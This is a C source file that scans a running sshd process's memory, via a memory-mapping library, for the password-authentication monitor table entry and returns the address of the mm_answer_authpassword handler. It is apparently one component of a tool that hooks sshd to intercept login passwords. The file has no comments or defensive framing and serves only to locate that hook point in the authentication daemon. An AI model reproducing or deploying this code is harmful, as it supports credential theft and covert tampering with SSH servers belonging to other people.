#include "authpassword-scan.h"
#include "ssh-definitions.h"
#include "memutils.h"
#include <string.h>
#include <stdlib.h>

struct mon_table tbl[] = {
	// {MONITOR_REQ_SIGN, MON_ONCE, NULL},
	// {MONITOR_REQ_PWNAM, MON_ONCE, NULL},
	// {MONITOR_REQ_AUTHSERV, MON_ONCE, NULL},
	// {MONITOR_REQ_AUTH2_READ_BANNER, MON_ONCE, NULL},
	{MONITOR_REQ_AUTHPASSWORD, MON_AUTH, NULL}
};

#define TBLSIZE (sizeof(tbl) / sizeof(struct mon_table))

static uint64_t memsearch_montable(const char *mem, uint64_t start,
	uint64_t end, size_t len)
{
	uint64_t pos = (uint64_t)-1;
	size_t i, j = 0;

	for (i = 0; i + sizeof(tbl) < len; i++) {
		struct mon_table *aux = (struct mon_table *)(mem + i);
		for (j = 0; j < TBLSIZE; j++, aux++) {
			if (aux->type != tbl[j].type || aux->flags != tbl[j].flags ||
				(uint64_t)aux->f < start || (uint64_t)aux->f >= end) {
				break;
			}
		}

		if (j == TBLSIZE) {
			pos = (uint64_t)(aux - 1)->f;
			break;
		}
	}

	return pos;
}

static uint64_t memmem_mon_table(pid_t pid, const char *sshd,
	ignotum_maplist_t *maplist, uint64_t start, uint64_t end)
{
	ignotum_mapinfo_t *map;
	size_t i;

	uint64_t match = -1;

	for (i = 0; i < maplist->len; i++) {
		map = maplist->maps + i;
		if (!map->pathname || strcmp(map->pathname, sshd))
			continue;

		char *memory;

		if ((memory = memory_dump(pid, map->start_addr, map->end_addr)) == NULL)
			goto end;

		match = memsearch_montable(memory, start, end,
			map->end_addr - map->start_addr);
		free(memory);

		if (match != (uint64_t)-1)
			break;
	}

end:
	return match;
}

uint64_t get_mm_answer_authpassword(pid_t pid, const char *sshd)
{
	ignotum_maplist_t maplist;
	ignotum_mapinfo_t *map;

	uint64_t start = 0, end;

	ssize_t n, i;
	uint64_t ret = -1;

	if ((n = ignotum_getmaplist(&maplist, pid)) < 1)
		goto end;

	for (i = 0; i < n; i++) {
		map = maplist.maps + i;

		if (map->pathname && !strcmp(map->pathname, sshd) && map->is_x) {
			start = map->start_addr;
			end = map->end_addr;
			break;
		}
	}

	if (!start)
		goto end;

	ret = memmem_mon_table(pid, sshd, &maplist, start, end);

end:
	free_ignotum_maplist(&maplist);
	return ret;
}
